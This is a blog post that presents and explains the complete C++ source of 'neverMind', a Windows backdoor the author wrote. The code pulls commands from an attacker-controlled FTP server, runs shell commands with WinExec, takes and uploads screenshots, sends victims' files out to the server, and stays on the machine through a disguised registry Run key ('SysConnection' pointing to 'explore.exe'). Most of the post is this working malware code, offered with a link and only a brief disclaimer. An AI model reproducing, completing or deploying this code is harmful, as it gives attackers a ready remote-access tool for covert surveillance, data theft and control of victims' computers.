---
title: "neverMind"
date: 2024-01-18T11:05:32-05:00
draft: false
type: "post"
---

![neverMind](/neverMind.png)

as part of a post-layoff glow-up, i began to delve deeper into programming and building my own tools. a lot of these tools are based on specific actions, like attacks, analysis, etc. one thing i've always been fascinated with though is object-oriented programming used to build applications from the ground up, specifically backdoors.

backdoors are often used for securing remote access to a computer. they're used for legitimate purposes, like by system administrators for system management (fix issues, install updates, perform maintenance) without being physically present. however, one need only hop a short distance from legitimate purposes to malicious activities, as hackers often use backdoors to steal sensitive data, install additional malware, and launch attacks against other systems.

so i wrote one myself.

**`neverMind`** is a backdoor that allows remote command execution (aka **RCE**) on a target system via FTP (file transfer protocol). view the source code [here](https://github.com/bilals12/neverMind/tree/main) and follow along!

## overview

the gist of how `neverMind` works is simple: the program is controlled remotely via commands stored in text file on an FTP server. for this, 2 basic conditions need to be fulfilled:

1. the program needs an FTP server to be set up with a specific directory structure. inside this directory, there needs to be a file (named `cmd.txt` for example) that contains the commands to be executed.

2. the `cmd.txt` file needs to have each line representing a separate command. the program supports several commands: `print`, `screen`, `upload`, `download`, `exec`.

## flow

1. **initialization**: the program begins by creating an instance of the `neverMind` class, which takes the FTP server's host, username, and password as parameters. this instance is used to manage the backdoor's operations.

2. **setup**: if the backdoor hasn't been set up before, the `setup` method in the `neverMind` class creates the necessary directories and adds the backdoor to the registry for persistence.

3. **command execution**: the `start` method in the `neverMind` class is the main driver of the program. it connects to the FTP server, downloads the `cmd.txt` file, compiles + executes the commands, and then uploads the `output.txt` file.

4. **command compilation**: the `compile` method reads the `cmd.txt` file, splits each line into a vector of strings, and then executes each command.

5. **command handling**: the `execute` method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: `print`, `screen`, `upload`, `download`, `exec`.

6. **FTP operations**: the `neverMind` class uses an instance of the `ftpC` class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.

7. **utility functions**: the `wrapper` class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.

8. **persistence**: the program adds itself to the registry to ensure it runs every time the system starts.

9. **cleanup**: when the program is done, it closes the FTP + internet connections in the `ftpC` class destructor.

## code

### the wrapper

the `wrapper` class defined in `wrapper.h` and implemented in `wrapper.cpp` provides a set of utility functions for file operations, system information retrieval, and screen capture. 

#### file operations

- `read_file(const std::string& file_path)`: reads the content of a file located at `file_path` and returns it as a string. If the file cannot be opened, it throws a `FileError` exception.

```cpp
std::string wrapper::read_file(const std::string &file_path)
    {
        std::ifstream file(file_path);
        if (!file.is_open())
            throw FileError("[!] failed to open file: " + file_path);
        std::string text;
        std::string line;
        while (std::getline(file, line)) {
            text += line + "\n";
        }
        return text;
    }
```

- `write_file(const std::string& file_path, const std::string& content)`: writes content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.

```cpp
void wrapper::write_file(const std::string &file_path, const std::string &content)
    {
        std::ofstream file(file_path);
        if (!file.is_open())
            throw FileError("[!] failed to open file: " + file_path);
        file << content;
    }
```

- `append_file(const std::string& file_path, const std::string& content)`: appends content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.

```cpp
void wrapper::append_file(const std::string& file_path, const std::string& content)
    {
        std::ofstream file(file_path, std::ios_base::app);
        if (!file.is_open())
            throw FileError("[!] failed to open file: " + file_path);
        file << content;
    }
```

- `path_exists(const std::string& path)`: checks if a path exists in the file system and returns a boolean value indicating the result.

```cpp
bool wrapper::path_exists(const std::string& path)
    {
        return std::filesystem::exists(path);
    }
```

#### system information retrieval

- `get_username()`: retrieves the username of the current user from the environment variables.

```cpp
std::string wrapper::get_username()
    {
        char env[] = "USERNAME";
        DWORD username_len = 257;
        char buffer[4096];
        unsigned int out_size = GetEnvironmentVariableA(env, buffer, username_len);
        return std::string(buffer, out_size);
    }
```

- `last_error_string()`: Retrieves the last error message recorded by the system.

```cpp
std::string wrapper::last_error_string()
    {
        DWORD errorMessageID = ::GetLastError();
        if (errorMessageID == 0)
            return std::string(); // no error recorded
        LPSTR messageBuffer = nullptr;
        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
        std::string message(messageBuffer, size);
        LocalFree(messageBuffer); // free up the buffer
        return message;
    }
```

- `listdir(const std::string& path)`: Lists the contents of a directory specified by path and returns them as a vector of strings.

```cpp
std::vector<std::string> wrapper::listdir(const std::string& path)
    {
        std::vector<std::string> directory_content;
        for (const auto& val : std::filesystem::directory_iterator(path)) {
            std::string content = val.path().u8string();
            std::size_t last_idx = content.find_last_of("\\");
            directory_content.push_back(content.substr(last_idx + 1));
        }
        return directory_content;
    }
```

- `get_date()`: Returns the current date and time as a string in the format "dd-mm-yyyy_hh-mm-ss".

```cpp
std::string wrapper::get_date()
    {
        auto t = std::time(nullptr);
        auto tm = *std::localtime(&t);
        std::ostringstream oss;
        oss << std::put_time(&tm, "%d-%m-%Y_%H-%M-%S");
        return oss.str();
    }
```

#### screen capture

- `createBitmapHeader(int width, int height)`: creates a bitmap header with the specified width and height.

```cpp
BITMAPINFOHEADER wrapper::createBitmapHeader(int width, int height)
{
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    return bi;
}
```

- `GdiPlusScreenCapture(HWND hWnd)`: captures the screen of the window specified by `hWnd` and returns a handle to the bitmap of the screenshot.

```cpp
HBITMAP wrapper::GdiPlusScreenCapture(HWND hWnd)
{
    HDC hwindowDC = GetDC(hWnd);
    HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);
    int scale = 1;
    int screenx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screeny = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    BITMAPINFOHEADER bi = wrapper::createBitmapHeader(width, height);
    SelectObject(hwindowCompatibleDC, hbwindow);
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    DeleteDC(hwindowCompatibleDC);
    ReleaseDC(hWnd, hwindowDC);
    return hbwindow;
}
```


- `saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat)`: saves a bitmap specified by `hbitmap` to memory in the format specified by `dataFormat` and stores the data in data.

```cpp
bool wrapper::saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat)
{
    Gdiplus::Bitmap bmp(*hbitmap, nullptr);
    IStream* istream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &istream);
    CLSID clsid;
    if (dataFormat.compare("bmp") == 0) { CLSIDFromString(L"{557cf400-1a04-11d3-9a73-0000f81ef32e}", &clsid); }
    else if (dataFormat.compare("jpg") == 0) { CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); }
    else if (dataFormat.compare("gif") == 0) { CLSIDFromString(L"{557cf402-1a04-11d3-9a73-0000f81ef32e}", &clsid); }
    else if (dataFormat.compare("tif") == 0) { CLSIDFromString(L"{557cf405-1a04-11d3-9a73-0000f81ef32e}", &clsid); }
    else if (dataFormat.compare("png") == 0) { CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &clsid); }
    Gdiplus::Status status = bmp.Save(istream, &clsid, NULL);
    if (status != Gdiplus::Status::Ok)
        return false;
    HGLOBAL hg = NULL;
    GetHGlobalFromStream(istream, &hg);
    int bufsize = GlobalSize(hg);
    data.resize(bufsize);
    LPVOID pimage = GlobalLock(hg);
    memcpy(&data[0], pimage, bufsize);
    GlobalUnlock(hg);
    istream->Release();
    return true;
}
```

- `screenshot(const std::string& path)`: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.

```cpp
std::string wrapper::screenshot(const std::string& path)
{
    std::string full_path = (std::filesystem::path(path) / std::filesystem::path((wrapper::get_date() + ".jpg"))).u8string();
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    HWND hWnd = GetDesktopWindow();
    HBITMAP hBmp = wrapper::GdiPlusScreenCapture(hWnd);
    std::vector<BYTE> data;
    std::string dataFormat = "jpg";
    if (wrapper::saveToMemory(&hBmp, data, dataFormat))
    {
        std::ofstream fout(full_path, std::ios::binary);
        fout.write((char*)data.data(), data.size());
    }
    else
        return "";
    GdiplusShutdown(gdiplusToken);
    return full_path;
}
```

this function initializes GDI+, captures the screen, saves the captured image to memory in JPEG format, writes the image data to a file, and then shuts down GDI+. the file is saved in the directory specified by path and its name is the current date and time. the full path of the file is returned. if the image cannot be saved to memory, an empty string is returned.

### ftpC

the `ftpC` class defined in `ftp.h` and implemented in `ftp.cpp` provides a set of functions for FTP operations. the `ftpC` class uses the WinINet API to perform FTP operations. The `m_host`, `m_username`, and `m_password` member variables store the host, username, and password for the FTP connection. The `ftpIO` and `ftpS` member variables are handles to the internet connection and the FTP session, respectively.

#### constructor + destructor

- `ftpC(const std::string& host, const std::string& username, const std::string& password)`: the constructor initializes the FTP connection with the provided host, username, and password. 

```cpp
ftpC::ftpC(const std::string& host, const std::string& username, const std::string& password)
        : m_host(host), m_username(username), m_password(password), ftpIO(NULL), ftpS(NULL)
    {
    }
```

- `~ftpC()`: the destructor cleans up the FTP connection by closing the internet + FTP handles.

```cpp
ftpC::~ftpC()
    {
        if (ftpS)
        {
            InternetCloseHandle(ftpS);
            ftpS = NULL;
        }
        if (ftpIO)
        {
            InternetCloseHandle(ftpIO);
            ftpIO = NULL;
        }
    }
```

#### FTP operations

- `connect()`: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error. 

```cpp
void ftpC::connect()
    {
        ftpIO = InternetOpenA("SystemConnection", INTERNET_OPEN_TYPE_DIRECT, m_host.c_str(), 0, INTERNET_FLAG_CACHE_IF_NET_FAIL);
        if (ftpIO == NULL)
        {
            DWORD error = GetLastError();
            LPVOID lpMsgBuf;
            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&lpMsgBuf, 0, NULL);
            std::string errorMessage = static_cast<char*>(lpMsgBuf);
            LocalFree(lpMsgBuf);
            throw std::runtime_error("[!] failed to open connection: " + errorMessage);
        }
        ftpS = InternetConnectA(ftpIO, m_host.c_str(), INTERNET_DEFAULT_FTP_PORT, m_username.c_str(), m_password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        if (ftpS == NULL)
        {
            DWORD error = GetLastError();
            LPVOID lpMsgBuf;
            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                          NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&lpMsgBuf, 0, NULL);
            std::string errorMessage = static_cast<char*>(lpMsgBuf);
            LocalFree(lpMsgBuf);
            throw std::runtime_error("[!] failed to connect to ftp server: " + errorMessage);
        }
    }
```

- `upload_file(const std::string& local_path, const std::string& server_name)`: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.

```cpp
bool ftpC::upload_file(const std::string& local_path, const std::string& server_name)
    {
        BOOL result = FtpPutFileA(ftpS, local_path.c_str(), server_name.c_str(), FTP_TRANSFER_TYPE_BINARY, 0);
        return result;
    }
```

- `retr_file(const std::string& local_path, const std::string& server_name)`: this function downloads a file from the FTP server to the local path. 

```cpp
bool ftpC::retr_file(const std::string& local_path, const std::string& server_name)
    {
        BOOL result = FtpGetFileA(ftpS, server_name.c_str(), local_path.c_str(), 0, 0, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_HYPERLINK);
        return result;
    }
```

- `mkdir(const std::string& folder_name)`: this function creates a new directory on the FTP server with the specified folder name.

```cpp
bool ftpC::mkdir(const std::string& folder_name)
    {
        BOOL result = FtpCreateDirectoryA(ftpS, folder_name.c_str());
        return result;
    }
```

- `cd(const std::string& server_path)`: this function changes the current directory on the FTP server to the directory specified by `server_path`.

```cpp
bool ftpC::cd(const std::string& server_path)
    {
        BOOL result = FtpSetCurrentDirectoryA(ftpS, server_path.c_str());
        return result;
    }
```

### neverMind

the `neverMind` class defined in `neverMind.h` and implemented in `neverMind.cpp` provides a set of functions for backdoor operations.

#### constructor + destructor

- `neverMind(const std::string &host, const std::string &username, const std::string &password)`: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.

```cpp
neverMind::neverMind(const std::string &host, const std::string &username, const std::string &password)
        : ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper::get_username()), store_path("C:\\Users\\" + win_username + "\\AppData\\Local\\SystemConnect"), data_path((std::filesystem::path(store_path) / "data").u8string()), app_path((std::filesystem::path(store_path) / "app").u8string()), output_path((std::filesystem::path(data_path) / "output.txt").u8string())
    {
    }
```

- `~neverMind()`: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!

```cpp
neverMind::~neverMind()
    {
    }
```

#### backdoor operations 

- `start()`: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.

```cpp
void neverMind::start()
    {
        if (!std::filesystem::exists(store_path))
            setup();
        ftp_connection.connect();
        if (!ftp_connection.cd(win_username)) {
            ftp_connection.mkdir(win_username);
            ftp_connection.cd(win_username);
        }
        std::string file_path = (std::filesystem::path(app_path) / "cmd.txt").u8string();
        if (ftp_connection.retr_file(file_path, "cmd.txt")) {
            Sleep(1500);
            compile(file_path);
        }
        ftp_connection.upload_file(output_path, "output.txt");
        Sleep(2000);
    }
```

- `setup()`: this function sets up necessary directories and adds the backdoor to the registry for persistence.

```cpp
void neverMind::setup()
    {
        std::filesystem::create_directory(store_path);
        std::filesystem::create_directory(data_path);
        std::filesystem::create_directory(app_path);
        add_to_reg();
    }
```

- `add_to_reg()`: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \"" + dest + "\"` adds a new entry `SysConnection` to the `Run` key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.

```cpp
void neverMind::add_to_reg()
    {
        WCHAR path[MAX_PATH];
        int len = GetModuleFileNameW(NULL, path, MAX_PATH);
        std::string new_path;
        std::string dest = (std::filesystem::path(store_path) / "explore.exe").u8string();
        for (int i = 0; i < len; ++i)
            new_path += path[i];
        std::filesystem::copy_file(new_path, dest);
        system(std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \"" + dest + "\"").c_str());
    }
```

- `compile(const std::string &file_path)`: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.

```cpp
void neverMind::compile(const std::string &file_path)
    {
        std::string code = wrapper::read_file(file_path);
        std::stringstream ss_code(code);
        std::string line;
        while (std::getline(ss_code, line))
        {
            try {
                std::vector<std::string> spl_line;
                std::stringstream ss_line(line);
                std::string command;
                while (std::getline(ss_line, command, ' ')) {
                    spl_line.push_back(command);
                }
                execute(spl_line);
            }
            catch (...) {
                continue;
            }
        }
    }
```

- `execute(const std::vector<std::string>& spl_line)`: this function executes the provided commands. it supports several commands like `print`, `screen`, `upload`, `download`, `exec`. each command performs a specific operation and writes the result to the output file.

```cpp
void neverMind::execute(const std::vector<std::string>& spl_line)
{
        try {
            std::string main_cmd = spl_line[0];
            if (main_cmd == "print") {
                if (spl_line.size() < 2) {
                    wrapper::append_file(output_path, "[!] error [!]\n\n");
                    return;
                }
                wrapper::append_file(output_path, "[>] " + spl_line[1] + " [<]\n\n");
            }
            else if (main_cmd == "screen") {
                if (spl_line.size() < 2) {
                    wrapper::append_file(output_path, "[!] error [!]\n\n");
                    return;
                }
                int counter = std::stoi(spl_line[1]);
                if (!ftp_connection.cd("screens")) {
                    ftp_connection.mkdir("screens");
                    ftp_connection.cd("screens");
                }
                for (int i = 0; i < counter; ++i)
                {
                    std::string screenshot_path = wrapper::screenshot(data_path);
                    Sleep(500);
                    ftp_connection.upload_file(screenshot_path, std::filesystem::path(screenshot_path).filename().u8string());
                    Sleep(1000);
                    wrapper::append_file(output_path, "[++] screenshots saved >> " + screenshot_path + " [++]\n\n");
                }
                ftp_connection.cd("../");
            }
            else if (main_cmd == "upload") {
                if (spl_line.size() < 3) {
                    wrapper::append_file(output_path, "[!] error [!]\n\n");
                    return;
                }
                if (!ftp_connection.cd("uploads")) {
                    wrapper::append_file(output_path, "[!] folder not found [!]\n\n");
                    return;
                }
                if (ftp_connection.retr_file(spl_line[2], spl_line[1]))
                    wrapper::append_file(output_path, "[++] file upload successful [++]\n\n");
                else
                    wrapper::append_file(output_path, "[!!] upload error [!!]\n\n");
                ftp_connection.cd("../");
            }
            else if (main_cmd == "download") {
                if (spl_line.size() < 2) {
                    wrapper::append_file(output_path, "[!] error [!]\n\n");
                    return;
                }
                if (!ftp_connection.cd("downloads")) {
                    ftp_connection.mkdir("downloads");
                    ftp_connection.cd("downloads");
                }
                if (ftp_connection.upload_file(spl_line[1], std::filesystem::path(spl_line[1]).filename().u8string()))
                    wrapper::append_file(output_path, "[++] file download successful [++]\n\n");
                else
                    wrapper::append_file(output_path, "[!!] downloading error [!!]\n\n");
                ftp_connection.cd("../");
            }
            else if (main_cmd == "exec") {
                if (spl_line.size() < 2) {
                    wrapper::append_file(output_path, "[!] error [!]\n\n");
                    return;
                }
                WinExec(std::string("cmd \"d:" + spl_line[1] + "f\"").c_str(), 0);
            }
            else {
                wrapper::append_file(output_path, "[!!] command: " + main_cmd + "not found [!!]\n\n");
            }
        }
        catch (...)
        {
            wrapper::append_file(output_path, "[!!] error [!!]\n\n");
        }
}
```

### main

the `main.cpp` file creates an instance `M` of the `neverMind` class and starts the backdoor. it's the entry point of the application, and it contains the `wWinMain` function, which is the entry point in a Windows application linked with the `UNICODE` character set. the `host`, `username`, and `password` are the credentials of the FTP server. the `neverMind` object `M` is created and the backdoor is started by calling `M.start()`.

```cpp
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, int CmdShow)
{
    const std::string host = "host";
    const std::string username = "username";
    const std::string password = "password";

    neverMind M(host, username, password);
    M.start();

    return 0;
}
```

- `HINSTANCE hInstance`: a handle to the current instance of the application.

- `HINSTANCE hPrevInstance`: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.

- `PWSTR szCmdLine`: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.

- `int CmdShow`: controls how the window is to be shown. this parameter can be one of the following values: `SW_HIDE`, `SW_MAXIMIZE`, `SW_MINIMIZE`, `SW_RESTORE`, `SW_SHOW`, `SW_SHOWDEFAULT`, `SW_SHOWMAXIMIZED`, `SW_SHOWMINIMIZED`, `SW_SHOWMINNOACTIVE`, `SW_SHOWNA`, `SW_SHOWNOACTIVATE`, `SW_SHOWNORMAL`.


## conclusion

`neverMind` is a demonstration (ahem) of a backdoor application that uses FTP for C2 (command + control) operations. it's written in C++ and uses the Windows API and WinINet API for network operations. the program has 3 main components: the `ftpC` class, the `neverMind` class, and the `main.cpp` file.

`ftpC` provides a set of functions for FTP operations, including connecting to an FTP server, uploading/downloading files, and creating/switching directories. it uses the WinINet API, which is a high-level API for working with FTP, HTTP, and Gopher protocols.

`neverMind` uses the `ftpC` class to connect to the FTP server and perform file operations. it contains methods for setting up and starting the backdoor, compiling + executing commands from a file, and adding the backdoor to the Windows Registry for persistence. 

`main.cpp` is the entry point of the app. it creates an instance of the `neverMind` class with the FTP server credentials and starts the backdoor.

i wrote this program to better learn and understand how backdoors work and how they can use FTP for C2 operations. as a result, i learned how to use the Windows and WinINet APIs, how to work with the Windows Registry for persistence, and how to execute system commands and capture their output.

it's important to note that this program is a demonstration of malware. it should not be used illegally. understanding how such software works can help in developing security measures + tools to detect and remove such threats. it can also be used to learn more about system internals and network programming. 

happy hacking!


